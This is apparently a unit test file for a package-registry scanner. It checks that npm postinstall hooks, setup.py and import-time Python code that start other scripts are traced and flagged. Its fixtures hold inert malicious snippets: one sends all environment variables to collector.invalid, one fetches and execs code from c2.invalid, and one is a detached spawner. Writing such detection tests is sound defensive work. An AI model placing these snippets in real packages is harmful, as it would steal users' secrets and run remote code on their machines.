"""0.1.8: a registry scan follows the scripts an install script or
import-time code starts with node or python (core.spawned_scripts) to the
package file each runs, and tests that file like the one that started it.

react-thunk-log's postinstall only started another file of the package,
detached; the 2026 lightning release's __init__.py started
_runtime/start.py with sys.executable. Payload text is inert: hosts are
.invalid, nothing runs.
"""
import json
import unittest

from tests.registry._review_support import scan_npm, scan_sdist, scan_wheel

WORKER = ("const https = require('https');\nconst body = JSON.stringify(process.env);\n"
          "https.request({ host: 'collector.invalid', method: 'POST' }).end(body);\n")
STARTER = ("const { spawn } = require('child_process');\nconst path = require('path');\n"
           "const filePath = path.join(__dirname, 'worker/run.js');\n"
           "spawn(process.execPath, [filePath], { detached: true, stdio: 'ignore' }).unref();\n")
FETCH_RUN_PY = "import requests\nexec(requests.get('https://c2.invalid/p').text)\n"


def hooks(res):
    return [(i["file"], i["sev"], i["msg"]) for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]


class StartedScriptTests(unittest.TestCase):
    def test_an_install_hook_that_starts_another_script(self):
        manifest = json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node lib/start.js"}})
        res = scan_npm({"package.json": manifest, "lib/start.js": STARTER, "lib/worker/run.js": WORKER})
        self.assertEqual(hooks(res), [("package.json", "CRITICAL",
                                       "Install hook runs lib/start.js, which starts lib/worker/run.js, which reads "
                                       "environment variables or credential files and sends data over the network.")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_chain_of_starts_is_followed_and_bounded(self):
        chain = {f"lib/s{k}.js": f"const path = require('path');\n"
                                 f"require('child_process').fork(path.join(__dirname, 's{k + 1}.js'));\n"
                 for k in range(6)}
        manifest = json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node lib/s0.js"}})
        near = dict(chain, **{"lib/s3.js": WORKER})
        res = scan_npm({"package.json": manifest, **near})
        self.assertEqual([sev for _f, sev, _m in hooks(res)], ["CRITICAL"])          # three starts deep
        far = dict(chain, **{"lib/s6.js": WORKER})
        res = scan_npm({"package.json": manifest, **far})
        self.assertEqual([sev for _f, sev, _m in hooks(res)], ["MAJOR"])             # past _SPAWN_MAX_DEPTH

    def test_import_time_code_that_starts_a_script(self):
        init = ("import os, subprocess, sys\n_rt = os.path.join(os.path.dirname(__file__), '_runtime')\n"
                "_start = os.path.join(_rt, 'start.py')\nif os.path.exists(_start):\n"
                "    subprocess.Popen([sys.executable, _start], start_new_session=True)\n")
        res = scan_wheel({"lit/__init__.py": init, "lit/_runtime/start.py": FETCH_RUN_PY,
                          "lit-1.0.dist-info/METADATA": "Name: lit\nVersion: 1.0\n"})
        found = [(i["rule"], i["file"], i["sev"]) for i in res["issues"] if i["rule"] in ("SC-IMPORT-RISK", "SC-USE-RISK")]
        self.assertEqual(found, [("SC-IMPORT-RISK", "lit/_runtime/start.py", "CRITICAL")])

    def test_setup_py_that_starts_a_script(self):
        setup = ("import subprocess, sys\nfrom setuptools import setup\n"
                 "subprocess.run([sys.executable, 'tools/helper.py'])\nsetup(name='x', version='1.0')\n")
        res = scan_sdist({"setup.py": setup, "tools/helper.py": FETCH_RUN_PY})
        self.assertIn(("tools/helper.py", "CRITICAL",
                       "tools/helper.py runs when pip builds or installs this sdist, and it runs code it receives "
                       "over the network."), hooks(res))

    def test_a_plain_path_at_import_time_is_the_users_directory(self):
        init = "import subprocess, sys\nsubprocess.Popen([sys.executable, 'x/start.py'])\n"
        res = scan_wheel({"x/__init__.py": init, "x/start.py": FETCH_RUN_PY,
                          "x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"})
        self.assertNotIn("SC-IMPORT-RISK", [i["rule"] for i in res["issues"]])


if __name__ == "__main__":
    unittest.main()
